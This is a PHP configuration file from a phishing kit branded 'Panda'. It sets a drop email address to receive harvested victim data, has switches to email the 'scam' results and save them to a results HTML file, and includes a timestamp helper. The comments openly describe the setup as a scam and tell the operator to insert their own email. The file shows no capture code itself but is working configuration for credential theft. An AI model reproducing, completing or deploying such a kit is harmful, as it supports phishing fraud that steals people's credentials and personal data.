<?php
/*  

 /$$$$$$$                           /$$          
| $$__  $$                         | $$          
| $$  \ $$ /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$ 
| $$$$$$$/|____  $$| $$__  $$ /$$__  $$ |____  $$
| $$____/  /$$$$$$$| $$  \ $$| $$  | $$  /$$$$$$$
| $$      /$$__  $$| $$  | $$| $$  | $$ /$$__  $$
| $$     |  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$
|__/      \_______/|__/  |__/ \_______/ \_______/
                                                 
                                                 
                                                                                                                
                                                               



*/
        ########################################################
         ############# [+] EMAIL INFORMATION [+] ##############
        ########################################################

     	$yours = "pandabc69@yandex.com"; // Edit this to your email 


	// ================================= //



	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	
	// ================================= //
	
	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	
	$filename = "results"; // Change |results| to any name you want this will be the (Rzlt file name).html
	// ================================= //

	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}

?>